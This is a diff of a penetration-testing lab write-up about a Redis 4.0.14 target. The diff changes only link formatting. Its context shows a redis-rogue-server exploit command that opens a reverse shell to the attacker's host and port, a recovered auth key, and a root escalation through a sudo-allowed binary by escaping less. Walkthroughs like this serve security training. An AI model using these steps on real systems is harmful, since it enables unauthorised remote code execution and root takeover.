@@ -35,9 +35,9 @@ redis_version:4.0.14
 
 ### Exploiting Redis
 
-https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce
+[Hacktricks - Redis RCE](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce)
 
-Exploit: https://github.com/n0b0dyCN/redis-rogue-server
+Exploit: [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)
 
 ```bash
 ./redis-rogue-server.py --rhost=192.168.160.176 --lhost=192.168.49.160 --lport=4242
@@ -60,7 +60,7 @@ Reverse server port: 4242
 
 ## Privelege Escalation
 
-It seems we have the permissions to run /usr/local/bin/redis-status as root user
+It seems we have the permissions to run **/usr/local/bin/redis-status** as root user
 
 `sudo -l`
 ```bash
@@ -90,4 +90,4 @@ ClimbingParrotKickingDonkey321
 
 Running the binary using `ClimbingParrotKickingDonkey321` as Auth Key will display the systemctl status output of "redis.service" in less
 
-We just escape less as root using - https://gtfobins.github.io/gtfobins/less/#sudo
+We just escape less as root using - [gtfobins - less](https://gtfobins.github.io/gtfobins/less/#sudo)
